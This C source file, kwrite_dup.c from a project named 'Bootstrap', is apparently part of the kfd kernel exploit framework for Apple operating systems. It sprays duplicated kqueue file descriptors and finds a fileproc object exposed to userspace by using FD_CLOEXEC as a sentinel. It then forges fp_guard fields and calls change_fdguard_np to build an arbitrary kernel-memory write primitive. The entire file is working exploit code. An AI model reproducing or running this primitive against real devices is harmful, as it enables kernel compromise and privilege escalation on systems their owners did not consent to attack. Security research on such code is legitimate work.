//
//  kwrite_dup.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include <stdio.h>
#include "kwrite_dup.h"

void kwrite_dup_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = ((kfd->kwrite.krkw_maximum_id + 1) * (sizeof(int32_t)));
    kfd->kwrite.krkw_method_data = malloc_bzero(kfd->kwrite.krkw_method_data_size);

    int32_t kqueue_fd = kqueue();
    assert(kqueue_fd > 0);

    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
    fds[kfd->kwrite.krkw_maximum_id] = kqueue_fd;
}

void kwrite_dup_allocate(struct kfd* kfd, uint64_t id)
{
    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
    int32_t kqueue_fd = fds[kfd->kwrite.krkw_maximum_id];
    int32_t fd = dup(kqueue_fd);
    assert(fd > 0);
    fds[id] = fd;
}

bool kwrite_dup_search(struct kfd* kfd, uint64_t object_uaddr)
{
    volatile struct fileproc* fp = (volatile struct fileproc*)(object_uaddr);
    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);

    if ((fp->fp_iocount == 1) &&
        (fp->fp_vflags == 0) &&
        (fp->fp_flags == 0) &&
        (fp->fp_guard_attrs == 0) &&
        (fp->fp_glob > PTR_MASK) &&
        (fp->fp_guard == 0)) {
        for (uint64_t object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
            assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));

            if (fp->fp_flags == 1) {
                kfd->kwrite.krkw_object_id = object_id;
                return true;
            }

            assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
        }

        /*
         * False alarm: it wasn't one of our fileproc objects.
         */
        print_warning("failed to find modified fp_flags sentinel");
    }

    return false;
}

void kwrite_dup_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite_from_method(uint64_t, kwrite_dup_kwrite_u64);
}

void kwrite_dup_find_proc(struct kfd* kfd)
{
    /*
     * Assume that kread is responsible for that.
     */
    return;
}

void kwrite_dup_deallocate(struct kfd* kfd, uint64_t id)
{
    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
    assert_bsd(close(fds[id]));
}

void kwrite_dup_free(struct kfd* kfd)
{
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}

void kwrite_dup_kwrite_u64(struct kfd* kfd, uint64_t kaddr, uint64_t new_value)
{
    if (new_value == 0) {
        print_warning("cannot write 0");
        return;
    }

    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
    int32_t kwrite_fd = fds[kfd->kwrite.krkw_object_id];
    uint64_t fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;
    volatile struct fileproc* fp = (volatile struct fileproc*)(fileproc_uaddr);

    const bool allow_retry = false;

    do {
        uint64_t old_value = 0;
        kread((uint64_t)(kfd), kaddr, &old_value, sizeof(old_value));

        if (old_value == 0) {
            print_warning("cannot overwrite 0");
            return;
        }

        if (old_value == new_value) {
            break;
        }

        uint16_t old_fp_guard_attrs = fp->fp_guard_attrs;
        uint16_t new_fp_guard_attrs = GUARD_REQUIRED;
        fp->fp_guard_attrs = new_fp_guard_attrs;

        uint64_t old_fp_guard = fp->fp_guard;
        uint64_t new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);
        fp->fp_guard = new_fp_guard;

        uint64_t guard = old_value;
        uint32_t guardflags = GUARD_REQUIRED;
        uint64_t nguard = new_value;
        uint32_t nguardflags = GUARD_REQUIRED;

        if (allow_retry) {
            syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL);
        } else {
            assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
        }

        fp->fp_guard_attrs = old_fp_guard_attrs;
        fp->fp_guard = old_fp_guard;
    } while (allow_retry);
}

